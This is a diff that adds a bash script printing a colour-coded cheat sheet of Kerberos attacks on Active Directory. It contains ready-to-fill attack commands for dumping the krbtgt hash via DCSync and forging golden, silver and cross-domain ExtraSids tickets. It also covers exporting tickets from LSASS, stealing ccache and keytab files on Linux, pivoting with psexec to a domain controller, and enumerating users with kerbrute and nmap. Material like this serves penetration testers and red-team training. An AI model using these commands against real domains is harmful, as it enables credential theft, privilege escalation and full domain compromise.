@@ -1,0 +1,60 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── KERBEROS — TICKETS & ATTACKS ─────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Golden Ticket ────────────────────────────────────${NC}"
+echo -e "  Note: Requires: krbtgt NTLM hash + domain SID"
+echo -e "  ${GREEN}lsadump::dcsync /domain:<DOMAIN> /user:krbtgt${NC}      # get krbtgt hash"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt${NC}"
+echo -e "  ${GREEN}ticketer.py -nthash '<KRBTGT_NT_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' administrator${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Silver Ticket ────────────────────────────────────${NC}"
+echo -e "  Note: Requires: service account NTLM hash"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:<DOMAIN> /sid:<SID> /rc4:<SERVICE_HASH> /target:server.<DOMAIN> /service:cifs /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Cross-Domain (ExtraSids) ─────────────────────────${NC}"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /krbtgt:<CHILD_KRBTGT_HASH> /sids:<PARENT_SID>-519 /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Ticket Management ────────────────────────────────${NC}"
+echo -e "  ${GREEN}kerberos::ptt ticket.kirbi${NC}                  # inject .kirbi ticket"
+echo -e "  ${GREEN}export KRB5CCNAME=/tmp/ticket.ccache${NC}        # use ccache"
+echo -e "  ${GREEN}klist${NC}                                       # list tickets"
+echo -e "  ${GREEN}klist -e${NC}                                    # with encryption"
+echo -e "  ${GREEN}kdestroy${NC}                                    # destroy tickets"
+echo -e "  ${GREEN}kinit -k -t /etc/krb5.keytab host/machine@<DOMAIN>${NC}  # keytab"
+echo -e "  ${GREEN}sekurlsa::tickets /export${NC}                   # export from LSASS"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ccache Theft (Linux) ─────────────────────────────${NC}"
+echo -e "  ${GREEN}find / -name 'krb5cc_*' 2>/dev/null${NC}"
+echo -e "  ${GREEN}cp /tmp/krb5cc_<random> /tmp/krb5cc_owned${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=/tmp/krb5cc_owned${NC}"
+echo -e "  ${GREEN}klist${NC}"
+echo -e "  ${GREEN}proxychains python3 psexec.py Administrator@DC01.<DOMAIN> -k -no-pass${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Keytab Abuse ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}find / -name '*.keytab' 2>/dev/null${NC}"
+echo -e "  ${GREEN}kinit -k -t /etc/krb5.keytab <USER>@<DOMAIN>${NC}"
+echo -e "  ${GREEN}smbclient -k //<DC_FQDN>/SYSVOL${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── User Enum via Kerberos ───────────────────────────${NC}"
+echo -e "  ${GREEN}kerbrute userenum -d <DOMAIN> users.txt --dc <DC_IP>${NC}"
+echo -e "  ${GREEN}nmap -p 88 --script-args krb5-enum-users.realm='<DOMAIN>',userdb=users.txt <DC_IP>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
